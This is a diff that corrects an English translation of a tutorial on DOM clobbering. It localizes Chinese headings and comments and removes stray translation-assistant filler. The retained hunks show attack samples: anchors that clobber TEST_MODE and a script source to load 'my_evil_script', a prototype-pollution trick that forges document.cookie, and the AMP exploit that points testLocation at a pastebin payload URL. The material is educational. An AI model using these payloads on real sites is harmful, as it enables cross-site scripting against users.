@@ -44,7 +44,7 @@ So, what would be your answer to make the code as short as possible?
 
 Before we continue, take a moment to think about the question. Once you have an answer in mind, let's proceed!
 
-Disclaimer:
+Spoiler alert:
 .  
 .  
 .  
@@ -118,9 +118,9 @@ So, a potential attack scenario might look like this:
 <!DOCTYPE html>
 <html>
 <body>
-  <h1>留言板</h1>
+  <h1>Comments</h1>
   <div>
-    你的留言：哈囉大家好
+    You comment: hello
   </div> 
   <script>
     if (window.TEST_MODE) {
@@ -146,9 +146,9 @@ So, you can do the following:
 <!DOCTYPE html>
 <html>
 <body>
-  <h1>留言板</h1>
+  <h1>Comments</h1>
   <div>
-    你的留言：<div id="TEST_MODE"></div>
+    Your comment: <div id="TEST_MODE"></div>
     <a id="TEST_SCRIPT_SRC" href="my_evil_script"></a>
   </div> 
   <script>
@@ -325,7 +325,7 @@ By using the same id, we allow `config` to access the HTMLCollection. Then, usin
 
 So, if the desired attribute is an HTML attribute, we can have four levels; otherwise, we can only have three levels.
 
-## Going Beyond with DOM Clobbering
+## More Nested
 
 The previous mention of three levels or conditionally four levels is already the limit. Is there a way to surpass this limitation?
 
@@ -372,7 +372,7 @@ With the help of iframes, we can create even more levels:
 </html>
 ```
 
-If you need more levels, you can use this useful tool: [DOM Clobber3r](https://splitline.github.io/DOM-Clobber3r/)
+If you need more levels, you can use this useful tool created by @splitline: [DOM Clobber3r](https://splitline.github.io/DOM-Clobber3r/)
 
 ## Expanding Attack Surface through document
 
@@ -420,7 +420,7 @@ In CTF challenges, it is often used in conjunction with the previously mentioned
 <body>
   <img name=cookie>
   <script>
-    // 先假設我們可以 pollute 成 function
+    // Assumed we can pollute an attribute to a custom function
     Object.prototype.toString = () => 'a=1'
     console.log(`cookie: ${document.cookie}`) // cookie: a=1
   </script>
@@ -430,7 +430,7 @@ In CTF challenges, it is often used in conjunction with the previously mentioned
 
 Why is that?
 
-Now, `document.cookie` is an HTML element. When using template output, if the content is not a string, the `toString` method is automatically called. However, HTML elements do not implement `toString` themselves. Therefore, according to the prototype chain, it eventually calls our polluted `Object.prototype.toString`, returning the polluted result.
+Now, `document.cookie` is an HTML element. When using template syntax, if the content is not a string, the `toString` method is automatically called. However, HTML elements do not implement `toString` themselves. Therefore, according to the prototype chain, it eventually calls our polluted `Object.prototype.toString`, returning the polluted result.
 
 By chaining these vulnerabilities, we can manipulate the value of `document.cookie` and thus affect the subsequent flow.
 
@@ -491,11 +491,11 @@ If we can make both `AMP_MODE.test` and `AMP_MODE.localDev` truthy, and set `win
 So, the exploit would look like this:
 
 ``` html
-// 讓 AMP_MODE.test 跟 AMP_MODE.localDev 有東西
+// clobber AMP_MODE.test and AMP_MODE.localDev
 <a id="AMP_MODE" name="localDev"></a>
 <a id="AMP_MODE" name="test"></a>
 
-// 設置 testLocation.protocol
+// set testLocation.protocol
 <a id="testLocation"></a>
 <a id="testLocation" name="protocol" 
    href="https://pastebin.com/raw/0tn8z0rG#"></a>
@@ -503,7 +503,7 @@ So, the exploit would look like this:
 
 Finally, by successfully loading any script, XSS can be achieved! (However, the author was only able to reach this step before being blocked by CSP, showing that CSP is still very useful).
 
-This is one of the most famous examples of DOM clobbering, and the researcher who discovered this vulnerability is Michał Bentkowski, who has created many classic cases mentioned previously when discussing Mutation XSS and Kibana.
+This is one of the most famous examples of DOM clobbering, and the researcher who discovered this vulnerability is Michał Bentkowski, who has created many classic cases mentioned previously when discussing Mutation XSS and prototype pollution.
 
 ## Conclusion
 
@@ -521,5 +521,3 @@ References:
 6. [Is there a spec that the id of elements should be made global variable?](https://stackoverflow.com/questions/6381425/is-there-a-spec-that-the-id-of-elements-should-be-made-global-variable)
 7. [Why don't we just use element IDs as identifiers in JavaScript?](https://stackoverflow.com/questions/25325221/why-dont-we-just-use-element-ids-as-identifiers-in-javascript)
 8. [Do DOM tree elements with ids become global variables?](https://stackoverflow.com/questions/3434278/do-dom-tree-elements-with-ids-become-global-variables)
-
-Sure, please paste the Markdown content here and I will translate it for you.
